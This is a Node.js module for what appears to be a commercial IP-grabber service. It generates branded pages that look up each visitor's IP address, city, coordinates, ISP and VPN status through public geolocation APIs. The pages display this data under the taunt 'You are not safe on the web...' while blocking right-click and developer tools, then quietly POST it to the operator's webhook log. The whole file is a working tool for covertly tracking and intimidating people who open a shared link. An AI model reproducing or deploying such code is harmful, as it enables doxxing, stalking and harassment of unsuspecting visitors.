const Deployment = require('../models/Deployment');
const User = require('../models/User');

async function generateDeployedPage(webhook, subdomain, userId) {
  // Haal user op voor branding
  const user = await User.findById(userId);
  const isBranded = user && (user.plan === 'elite' || user.plan === 'lifetime');
  
  // Branding kleuren
  const brandColor = isBranded ? (user.brandColor || '#7c3aed') : '#7c3aed';
  const brandName = isBranded ? (user.brandName || 'AURELIXA') : 'AURELIXA';
  const logoUrl = isBranded ? (user.logoUrl || '') : '';

  return `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>${brandName}</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{background:#0a0a0f;min-height:100vh;display:flex;justify-content:center;align-items:center;font-family:'Segoe UI',sans-serif;padding:20px}
        .container{max-width:750px;width:100%;text-align:center;background:rgba(255,255,255,0.02);border:1px solid rgba(255,255,255,0.04);border-radius:24px;padding:40px;backdrop-filter:blur(10px);box-shadow:0 20px 60px rgba(0,0,0,0.3)}
        ${logoUrl ? `.logo-img{max-width:120px;margin-bottom:15px;border-radius:12px}` : ''}
        h1{font-size:clamp(3rem,10vw,5rem);font-weight:900;color:${brandColor};text-transform:uppercase;letter-spacing:3px;line-height:1;margin-bottom:10px}
        .sub{font-size:clamp(1rem,3vw,1.8rem);color:#6a8aaa;font-weight:300;letter-spacing:2px;margin-bottom:30px}
        .info-box{background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.06);border-radius:12px;padding:20px;text-align:left;font-family:'Courier New',monospace;color:#c8c8e8;font-size:.85rem;line-height:1.9;max-height:320px;overflow-y:auto}
        .info-box pre{margin:0;white-space:pre-wrap;font-family:inherit;color:#d5b8e8}
        .timestamp{color:#666688;font-size:.7rem;border-top:1px solid rgba(255,255,255,0.06);padding-top:12px;margin-top:12px;text-align:right}
        .vpn-warning{color:#e67e22;font-weight:bold;margin-top:10px;padding:8px;border:1px solid #f0d5b0;border-radius:4px;background:rgba(230,126,34,0.05);display:none}
        .vpn-warning.show{display:block}
        .branding-footer{color:#444466;font-size:0.7rem;margin-top:16px;padding-top:12px;border-top:1px solid rgba(255,255,255,0.03)}
        ::-webkit-scrollbar{width:4px}
        ::-webkit-scrollbar-track{background:#0a0a0f}
        ::-webkit-scrollbar-thumb{background:${brandColor};border-radius:4px}
    </style>
</head>
<body>
    <div class="container">
        ${logoUrl ? `<img src="${logoUrl}" alt="Logo" class="logo-img">` : ''}
        <h1>${brandName}</h1>
        <div class="sub">You are not safe on the web...</div>
        <div class="info-box" id="infoBox">
            <pre id="infoContent">⏳ loading ...</pre>
            <div class="timestamp" id="timestampDisplay"></div>
        </div>
        <div class="vpn-warning" id="vpnWarning">⚠️ VPN/PROXY DETECTED - YOU ARE NOT HIDDEN</div>
        ${isBranded ? `<div class="branding-footer">⚡ Powered by ${brandName}</div>` : ''}
    </div>
    <script>
        document.addEventListener('contextmenu',e=>e.preventDefault());
        document.addEventListener('keydown',e=>{if(e.key==='F12'||(e.ctrlKey&&e.shiftKey&&['I','J','C'].includes(e.key.toUpperCase()))||(e.ctrlKey&&e.key==='u')){e.preventDefault();}});
        const now=new Date(),tz=Intl.DateTimeFormat().resolvedOptions().timeZone||'unknown',time=now.toLocaleString('en-US',{timeZone:tz,hour12:false,year:'numeric',month:'short',day:'numeric',hour:'2-digit',minute:'2-digit',second:'2-digit'});
        document.getElementById('timestampDisplay').innerText='⏱️ '+time+' ('+tz+')';
        const apiUrl='https://${process.env.DOMAIN}/api/webhook/log/${subdomain}';
        fetch('https://ipapi.co/json/').then(r=>r.ok?r.json():Promise.reject()).then(d=>{
            const vpn=(d.security||{}).is_vpn||(d.security||{}).is_proxy||(d.security||{}).is_tor||(d.security||{}).is_relay||false;
            if(vpn){document.getElementById('vpnWarning').classList.add('show');}
            const info='════════════════════════\\n'+
'IP          : '+(d.ip||'unknown')+'\\n'+
'City        : '+(d.city||'unknown')+'\\n'+
'Region      : '+(d.region||'unknown')+'\\n'+
'Country     : '+(d.country_name||'unknown')+'\\n'+
'ISP         : '+(d.org||d.isp||'unknown')+'\\n'+
'Coordinates : '+(d.latitude||'unknown')+', '+(d.longitude||'unknown')+'\\n'+
'Timezone    : '+(d.timezone||'unknown')+'\\n'+
'Currency    : '+(d.currency||'unknown')+'\\n'+
'ASN         : '+(d.asn||'unknown')+'\\n'+
'VPN/Proxy   : '+(vpn?'⚠️ DETECTED':'❌ NOT DETECTED');
            document.getElementById('infoContent').innerText=info;
            fetch(apiUrl,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({
                ip:d.ip||'unknown',
                city:d.city||'unknown',
                region:d.region||'unknown',
                country:d.country_name||'unknown',
                isp:d.org||d.isp||'unknown',
                lat:d.latitude||'unknown',
                lon:d.longitude||'unknown',
                timezone:d.timezone||'unknown',
                vpn:vpn
            })}).catch(()=>{});
        }).catch(()=>{
            fetch('https://ip-api.com/json/').then(r=>r.json()).then(d=>{
                const info='════════════════════════\\n'+
'IP          : '+(d.query||'unknown')+'\\n'+
'City        : '+(d.city||'unknown')+'\\n'+
'Region      : '+(d.regionName||'unknown')+'\\n'+
'Country     : '+(d.country||'unknown')+'\\n'+
'ISP         : '+(d.isp||'unknown')+'\\n'+
'Coordinates : '+(d.lat||'unknown')+', '+(d.lon||'unknown')+'\\n'+
'Timezone    : '+(d.timezone||'unknown')+'\\n'+
'ASN         : '+(d.as||'unknown')+'\\n'+
'VPN/Proxy   : ⚠️ UNABLE TO CHECK';
                document.getElementById('infoContent').innerText=info;
                fetch(apiUrl,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({
                    ip:d.query||'unknown',
                    city:d.city||'unknown',
                    region:d.regionName||'unknown',
                    country:d.country||'unknown',
                    isp:d.isp||'unknown',
                    lat:d.lat||'unknown',
                    lon:d.lon||'unknown',
                    timezone:d.timezone||'unknown',
                    vpn:false
                })}).catch(()=>{});
            }).catch(()=>{
                document.getElementById('infoContent').innerText='════════════════════════\\nStatus : location unavailable\\nTime   : '+time+'\\nTimezone : '+tz;
            });
        });
    </script>
</body>
</html>`;
}

async function deleteExpiredDeployments() {
  try {
    const now = new Date();
    const expired = await Deployment.find({ expiresAt: { $lt: now }, active: true });
    for (const deploy of expired) {
      deploy.active = false;
      await deploy.save();
      console.log('🗑️ Deleted expired deployment:', deploy.subdomain);
    }
  } catch (error) {
    console.error('Error deleting expired deployments:', error);
  }
}

module.exports = { generateDeployedPage, deleteExpiredDeployments };
